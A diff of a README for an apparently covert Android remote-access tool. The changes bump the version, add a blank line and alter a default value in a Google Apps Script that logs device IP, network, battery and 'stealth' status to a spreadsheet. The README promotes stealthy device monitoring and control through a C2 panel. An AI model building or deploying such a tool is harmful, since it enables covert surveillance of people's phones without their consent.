@@ -4,7 +4,7 @@
   </a>
 </p>
 
-## Lab-STAR: Advanced Android Tool (v1.4.5)
+## Lab-STAR: Advanced Android Tool (v1.5.0)
 
 A **powerful, lightweight** and **covert-oriented Android Tool** developed by K4N3CO.LABS. This advanced tool enables **monitoring, management** and **control** of **Android devices** through a **sleek web C2 interface** with **full support** on the **newest modern Android software releases**. (SDK 36+, OneUI 8.5)
 
@@ -107,6 +107,7 @@ The built-in shell has been overhauled for professional workflows:
 -   **System Diagnostics**: New `sysinfo` command for an aggregated hardware/software overview.
 -   **Modernized Interface**: Updated to `root@Android` prompt with a built-in `help` menu.
 -   **Hardened I/O**: Multi-stage retry logic and unique execution tracking for zero-latency command output.
+
 ---
 
 ## 📊 Google Sheet Setup Instructions (v1.4.5)
@@ -154,7 +155,7 @@ function handleRequest(e) {
       data.device || "Unknown",
       data.network || "Unknown",
       data.ip || "Unknown",
-      data.port || "8080",
+      data.port || "Unknown",
       data.link || "Unknown",
       data.battery || "Unknown",
       (data.stealth === true || data.stealth === "true") ? "ACTIVE" : "OFF"
